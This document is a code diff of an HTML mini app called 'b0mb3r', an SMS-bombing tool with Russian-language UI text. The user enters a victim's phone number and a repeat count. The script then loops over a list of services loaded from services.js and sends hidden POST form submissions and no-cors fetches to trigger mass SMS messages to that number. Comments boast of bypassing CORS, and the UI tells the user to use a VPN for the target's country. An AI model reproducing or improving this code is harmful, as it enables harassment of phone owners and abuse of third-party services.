@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>B0mb3r Mini App</title>
+    <title>b0mb3r</title>
     <style>
         :root {
             --bg-color: #0d1117; --card-bg: #161b22; --border-color: #30363d;
-            --accent-red: #d32f2f; --text-main: #c9d1d9; --text-dim: #484f58;
+            --accent-red: #d32f2f; --text-main: #c9d1d9;
         }
         * { -webkit-tap-highlight-color: transparent; box-sizing: border-box; outline: none; }
         body {
@@ -16,132 +16,111 @@
             display: flex; justify-content: center; align-items: center;
             height: 100vh; margin: 0; overflow: hidden;
         }
-        .main-container { text-align: center; width: 100%; max-width: 280px; z-index: 1; transition: 0.3s; }
+        .main-container { text-align: center; width: 100%; max-width: 280px; }
         .logo { font-size: 38px; font-weight: bold; margin-bottom: 5px; color: #fff; }
-        .services-count { color: #8b949e; font-size: 13px; margin-bottom: 20px; }
-        .count-badge { background: var(--accent-red); color: #fff; padding: 2px 7px; border-radius: 10px; font-size: 11px; }
+        .vpn-status { font-size: 11px; color: #238636; margin-bottom: 20px; border: 1px dashed #238636; padding: 5px; border-radius: 4px; }
         
-        .controls-row { display: flex; justify-content: center; gap: 6px; margin-bottom: 5px; }
+        .controls-row { display: flex; justify-content: center; gap: 6px; }
         .phone-group { display: flex; background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 6px; width: 200px; align-items: center; }
-        
         .custom-select { width: 80px; padding: 12px 5px; display: flex; align-items: center; justify-content: center; gap: 6px; cursor: pointer; }
-        .flag-icon { width: 18px; height: 18px; border-radius: 50%; }
         .phone-input { background: transparent; border: none; color: #fff; padding: 12px 5px; font-size: 13px; flex: 1; }
-
-        .repeat-group { background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 6px; width: 42px; height: 42px; display: flex; align-items: center; justify-content: center; }
-        .count-input { background: transparent; border: none; color: #fff; width: 100%; text-align: center; }
+        
+        .loops-group { background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 6px; width: 42px; height: 42px; }
+        .loops-input { background: transparent; border: none; color: #fff; width: 100%; height: 100%; text-align: center; }
 
         .btn-start { background: var(--accent-red); color: #fff; border: none; border-radius: 6px; padding: 12px; font-weight: bold; width: 100%; margin-top: 15px; cursor: pointer; }
+        .s-info { color: #8b949e; font-size: 11px; margin-top: 15px; }
 
-        .loader-overlay { position: fixed; inset: 0; display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 200; background: rgba(0,0,0,0.8); }
-        .spinner { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.1); border-left-color: var(--accent-red); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-
-        .country-drawer { position: fixed; bottom: -100%; left: 0; right: 0; background: #161b22; border-top: 1px solid var(--border-color); border-radius: 20px 20px 0 0; transition: 0.3s; z-index: 100; padding: 20px; }
-        .country-drawer.active { bottom: 0; }
-        .drawer-item { padding: 15px; border-bottom: 1px solid #21262d; display: flex; justify-content: space-between; cursor: pointer; }
+        .loader { position: fixed; inset: 0; display: none; flex-direction: column; align-items: center; justify-content: center; background: rgba(0,0,0,0.85); z-index: 100; }
+        .drawer { position: fixed; bottom: -100%; left: 0; right: 0; background: #161b22; border-top: 1px solid var(--border-color); border-radius: 20px 20px 0 0; transition: 0.3s; z-index: 110; padding: 20px; }
+        .drawer.active { bottom: 0; }
+        .d-item { padding: 15px; border-bottom: 1px solid #21262d; display: flex; justify-content: space-between; }
         .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.7); display: none; z-index: 90; }
     </style>
 </head>
 <body>
-    <div class="overlay" id="overlay"></div>
-    <div class="loader-overlay" id="loader">
-        <div class="spinner"></div>
-        <div id="progressText" style="color:#fff">Атака...</div>
-    </div>
+    <div class="overlay" id="ovl"></div>
+    <div class="loader" id="ldr"><div style="color:#fff" id="stat">Отправка...</div></div>
 
-    <div class="main-container" id="mainContent">
-        <div class="logo">B0MB3R 💣</div>
-        <div class="services-count">Сервисов в базе: <span class="count-badge" id="sCount">27</span></div>
-        <form id="bombForm">
+    <div class="main-container">
+        <div class="logo">b0mb3r 💣</div>
+        <div class="vpn-status">VPN: Пользовательский (Включите VPN страны цели)</div>
+        
+        <form id="bForm">
             <div class="controls-row">
                 <div class="phone-group">
-                    <div class="custom-select" id="countryTrigger">
-                        <img src="https://purecatamphetamine.github.io/country-flag-icons/3x2/RU.svg" class="flag-icon" id="currentFlag">
-                        <span id="currentCode">+7</span>
+                    <div class="custom-select" id="cTrig">
+                        <img src="https://purecatamphetamine.github.io/country-flag-icons/3x2/RU.svg" width="18" id="cFlag">
+                        <span id="cCode">+7</span>
                     </div>
                     <input type="tel" class="phone-input" id="phone" placeholder="9995203899" required>
                 </div>
-                <div class="repeat-group">
-                    <input type="number" class="count-input" id="loops" value="1" min="1" max="10">
+                <div class="loops-group">
+                    <input type="number" class="loops-input" id="loops" value="1">
                 </div>
             </div>
             <button type="submit" class="btn-start">ЗАПУСТИТЬ</button>
         </form>
+        <div class="s-info">Сервисов в базе: <span id="sCount">0</span></div>
     </div>
 
-    <div class="country-drawer" id="countryDrawer">
-        <div class="drawer-item" onclick="selectCountry('RU', '+7', '9995203899')"><span>🇷🇺 Россия</span> <span>+7</span></div>
-        <div class="drawer-item" onclick="selectCountry('UA', '+380', '501234567')"><span>🇺🇦 Украина</span> <span>+380</span></div>
-        <div class="drawer-item" onclick="selectCountry('BY', '+375', '291234567')"><span>🇧🇾 Беларусь</span> <span>+375</span></div>
-        <div class="drawer-item" onclick="selectCountry('KZ', '+7', '7012345678')"><span>🇰🇿 Казахстан</span> <span>+7</span></div>
+    <div class="drawer" id="drw">
+        <div class="d-item" onclick="sel('RU','+7')"><span>🇷🇺 Россия</span><span>+7</span></div>
+        <div class="d-item" onclick="sel('UA','+380')"><span>🇺🇦 Украина</span><span>+380</span></div>
+        <div class="d-item" onclick="sel('BY','+375')"><span>🇧🇾 Беларусь</span><span>+375</span></div>
+        <div class="d-item" onclick="sel('KZ','+7')"><span>🇰🇿 Казахстан</span><span>+7</span></div>
     </div>
 
     <div id="bridge" style="display:none"></div>
 
     <script src="services.js"></script>
     <script>
-        const drw = document.getElementById('countryDrawer');
-        const ovl = document.getElementById('overlay');
+        window.onload = () => { document.getElementById('sCount').innerText = SERVICES.length; };
+        
+        const drw = document.getElementById('drw');
+        const ovl = document.getElementById('ovl');
+        document.getElementById('cTrig').onclick = () => { drw.classList.add('active'); ovl.style.display='block'; };
+        ovl.onclick = () => { drw.classList.remove('active'); ovl.style.display='none'; };
 
-        document.getElementById('countryTrigger').onclick = () => { drw.classList.add('active'); ovl.style.display = 'block'; };
-        ovl.onclick = () => { drw.classList.remove('active'); ovl.style.display = 'none'; };
-
-        function selectCountry(iso, code, placeholder) {
-            document.getElementById('currentFlag').src = `https://purecatamphetamine.github.io/country-flag-icons/3x2/${iso}.svg`;
-            document.getElementById('currentCode').innerText = code;
-            document.getElementById('phone').placeholder = placeholder;
-            drw.classList.remove('active'); ovl.style.display = 'none';
+        function sel(iso, code) {
+            document.getElementById('cFlag').src = `https://purecatamphetamine.github.io/country-flag-icons/3x2/${iso}.svg`;
+            document.getElementById('cCode').innerText = code;
+            drw.classList.remove('active'); ovl.style.display='none';
         }
 
-        document.getElementById('bombForm').onsubmit = async (e) => {
+        document.getElementById('bForm').onsubmit = async (e) => {
             e.preventDefault();
-            const phone = document.getElementById('currentCode').innerText.replace('+', '') + document.getElementById('phone').value;
+            const fullPhone = document.getElementById('cCode').innerText.replace('+','') + document.getElementById('phone').value;
             const loops = parseInt(document.getElementById('loops').value) || 1;
-            const loader = document.getElementById('loader');
+            const ldr = document.getElementById('ldr');
+            const stat = document.getElementById('stat');
             const bridge = document.getElementById('bridge');
-            
-            loader.style.display = 'flex';
-            let sent = 0;
 
-            for (let l = 0; l < loops; l++) {
+            ldr.style.display = 'flex';
+            let total = 0;
+
+            for (let i = 0; i < loops; i++) {
                 for (const s of SERVICES) {
-                    sent++;
-                    document.getElementById('progressText').innerText = `Отправлено: ${sent}`;
-                    
+                    total++;
+                    stat.innerText = `Атака... [${total}]`;
                     try {
-                        const targetUrl = typeof s.url === 'function' ? s.url(phone) : s.url;
-                        
-                        // Метод "Скрытая форма" — обходит CORS в 90% случаев
+                        const target = typeof s.url === 'function' ? s.url(fullPhone) : s.url;
                         const form = document.createElement('form');
-                        form.method = 'POST';
-                        form.action = targetUrl;
-                        form.target = 'hidden_frame_' + sent;
-                        
-                        const input = document.createElement('input');
-                        // Проверяем название поля из твоего sms.kt (phone, number, mobile)
-                        input.name = s.formName || 'phone'; 
-                        input.value = s.json ? JSON.stringify(s.json(phone)) : phone;
-                        
-                        form.appendChild(input);
-                        bridge.appendChild(form);
-                        
-                        const ifr = document.createElement('iframe');
-                        ifr.name = 'hidden_frame_' + sent;
-                        bridge.appendChild(ifr);
-
+                        form.method = 'POST'; form.action = target; form.target = 'ifrm';
+                        const inp = document.createElement('input');
+                        inp.name = s.formName || 'phone';
+                        inp.value = s.json ? JSON.stringify(s.json(fullPhone)) : fullPhone;
+                        form.appendChild(inp);
+                        const ifr = document.createElement('iframe'); ifr.name = 'ifrm';
+                        bridge.appendChild(ifr); bridge.appendChild(form);
                         form.submit();
-                        
-                        // Метод Fetch no-cors для подстраховки
-                        fetch(targetUrl, { method: 'POST', mode: 'no-cors', body: new URLSearchParams(input.name + "=" + input.value) });
-
+                        setTimeout(() => bridge.innerHTML = '', 500);
                     } catch(e) {}
-                    await new Promise(r => setTimeout(r, 400));
-                    bridge.innerHTML = ''; // Очистка памяти
+                    await new Promise(r => setTimeout(r, 350));
                 }
             }
-            loader.style.display = 'none';
-            alert("Атака завершена!");
+            ldr.style.display = 'none';
+            alert("Завершено!");
         };
     </script>
 </body>
